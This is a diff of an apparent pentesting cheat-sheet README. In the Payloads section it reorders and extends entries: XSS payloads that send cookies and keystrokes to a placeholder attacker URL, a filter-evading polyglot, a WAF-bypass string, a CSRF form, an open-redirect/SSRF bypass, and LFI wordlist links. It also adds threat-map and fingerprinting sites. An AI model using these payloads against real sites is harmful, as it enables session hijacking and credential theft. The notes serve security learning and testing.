@@ -13,7 +13,7 @@
 	<li> <a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/scripts'> Scripts </a>
   	<li> <a href='#n1'> Commands </a>
   	<li> <a href='#n2'> Payloads</a> with description. <a href='https://github.com/Kode-n-Rolla/pentesting_time/tree/main/payloads'>Here</a> just payloads in file
-  	<li> <a href='#n3'> Helpful sites </a>
+  	<li> <a href='#n3'> Sites </a>
 	<li> <a href='#n4'> Tools </a>
 	<li> <a href='#n5'> Privilege Escalation </a>
 	<!-- <li> <a href='#n7'> AWS </a> -->
@@ -489,23 +489,28 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
    
 	
 <h2 align='center' id='n2'><em> Payloads </em></h2>
-<li> <a href='#n2.1'> XSS Payloads</a>
-<li> <a href='#n2.2'> CSRF</a>
-<li> <a href='#n2.3'> LFI Linux and Windwos Payloads</a>
-    <h3 id='n2.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS Payloads </h3>
-    <li> <b> Proof Of Concept (PoC) </b> - <pre><code> <script>alert('Success XSS!');</script> </code></pre>
-      <p> This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text "Success XSS".
-    <li> <b> Session Stealing </b> - <pre><code> <script>fetch('url/steal?cookie=' + btoa(document.cookie));</script> </code></pre>
-      <p> Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
-    <li> <b> Key Logger </b> - <pre><code> <scripr>document.onkeypress = function(v) {fetch('url/log?key=' + btoa(v.key));}</script> </code></pre>
-      <p> The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
-    <li> <b> Business Logic </b> - <pre><code> <script>user.changeEmail('e@mail.com');</script> </code></pre>
-      <p> This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail().
-    <li> <b> Polyglots </b> - <pre><code> jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Success XSS!'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Success XSS!')//>\x3e </code></pre>
-      <p> An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
-    <li> Description of XSS payloads <a href='https://netsec.expert/posts/xss-in-2020/'>here</a>
-
-<h3 id='n2.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CSRF </h3>
+<li> <a href='#n2.1'> LFI Linux and Windwos Payloads</a>
+<li> <a href='#n2.2'> XSS Payloads</a>
+<li> <a href='#n2.3'> CSRF</a>
+<li> <a href='#n2.4'> Chains</a>
+    <h3 id='n2.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LFI Payloads </h3>
+	<li> <a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux'> For Linux </a>
+ 	<li> <a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows'> For Windows </a>
+    <h3 id='n2.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS Payloads </h3>
+	    <li> <b> Proof Of Concept (PoC) </b> - <pre><code> <script>alert('Success XSS!');</script> </code></pre>
+	      <p> This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text "Success XSS".
+	    <li> <b> Session Stealing </b> - <pre><code> <script>fetch('url/steal?cookie=' + btoa(document.cookie));</script> </code></pre>
+	      <p> Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the 		hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
+	    <li> <b> Key Logger </b> - <pre><code> <scripr>document.onkeypress = function(v) {fetch('url/log?key=' + btoa(v.key));}</script> </code></pre>
+	      <p> The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card 		details.
+	    <li> <b> Business Logic </b> - <pre><code> <script>user.changeEmail('e@mail.com');</script> </code></pre>
+	      <p> This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail().
+	    <li> <b> Polyglots </b> - <pre><code> jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Success XSS!'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Success XSS!')//>\x3e </code></pre>
+	      <p> An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
+	    <li> XSS Bypass WAF:
+		    <pre><code>&lt;details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//</code></pre>
+	    <li> Description of XSS payloads <a href='https://netsec.expert/posts/xss-in-2020/'>here</a>
+<h3 id='n2.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CSRF </h3>
 	<pre><code>		
 &lt;html&gt;
     &lt;body&gt;
@@ -518,10 +523,10 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 &lt;/html&gt;
 	</code></pre>
 
-<h3 id='n2.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LFI Payloads </h3>
-	<li> <a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux'> For Linux </a>
- 	<li> <a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows'> For Windows </a>
-
+<h3 id='n2.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Chains </h3>
+	<li>Redirect bypasses for Open Redirect & SSRF!
+ 		<pre><code>?u=example2\.com  ❎
+?u=example\.com@example2\.com ✅</code></pre>
 
 <h3 align='right'><a href='#start'> <-- Back </a></h3>
 	      
@@ -638,11 +643,14 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 	      <li> <a href='https://passwordsdatabase.com/'> Passwordsdatabase</a> another one default passwords service
 	      <li> <a href='https://wiki.skullsecurity.org/index.php?title=Passwords'> This</a> wiki page includes the most well-known collections of passwords.
       <h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dashboards for Cyber Threat Monitoring </h3>
-       	      <li> <a href='https://cybermap.kaspersky.com/'> cybermap.kaspersky</a>. A colorful globe designed in the best traditions of Hollywood hacker movies. Its real value lies not in its design but in the 				informative panel with statistics collected from the company's security products. Additionally, Kaspersky Lab supports a dashboard with information on current threats, located 						<a href='https://statistics.securelist.com/'> here</a>.
-	      <li> <a href='https://livethreatmap.radware.com/'> Live Threat Map</a>. Here, you can view summary statistics on cyberattacks over the last hour, day, or month, as well as highlight the most targeted 				countries, top attack vectors, and most scanned ports.
+       	      <li> <a href='https://cybermap.kaspersky.com/'> cybermap.kaspersky</a>. A colorful globe designed in the best traditions of Hollywood hacker movies. Its real value lies not in its design but in the 				informative panel with 				statistics collected from the company's security products. Additionally, Kaspersky Lab supports a dashboard with information on current threats, located 						<a href='https://statistics.securelist.com/'> 			here</a>.
+	      <li> <a href='https://livethreatmap.radware.com/'> Live Threat Map</a>. Here, you can view summary statistics on cyberattacks over the last hour, day, or month, as well as highlight the most targeted 				countries, top attack 				vectors, and most scanned ports.
               <li> <a href='https://www.talosintelligence.com/reputation_center'> Talos Reputation Center</a>. A dashboard with general information on cyber threats, created by Talos with support from Cisco.
 	      <li> <a href='https://talosintelligence.com/fullpage_maps/pulse'> Cyber Attack Map</a>. A map featuring the top spam and malware-spreading servers.
-              <li> <a href='https://www.sicherheitstacho.eu/'> Sicherheitstacho</a>. A cyberattack dashboard from Deutsche Telekom, which operates on the open-source honeypot network: 							<a href='https://github.com/telekom-security/tpotce'> T-Pot</a>. 
+              <li> <a href='https://www.sicherheitstacho.eu/'> Sicherheitstacho</a>. A cyberattack dashboard from Deutsche Telekom, which operates on the open-source honeypot network: <a href='https://github.com/telekom-security/tpotce'> T-Pot</a>. 
+	<h3> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Other </h3>
+ 		<li> <a href='https://fpcentral.irisa.fr/'>fpcentral.irisa.fr</a>. Check fingerprint
+   		<li> <a href='https://amiunique.org/'>amiunique.org</a>. Like from above
 
 <h3 align='right'><a href='#start'> <-- Back </a></h3>
        
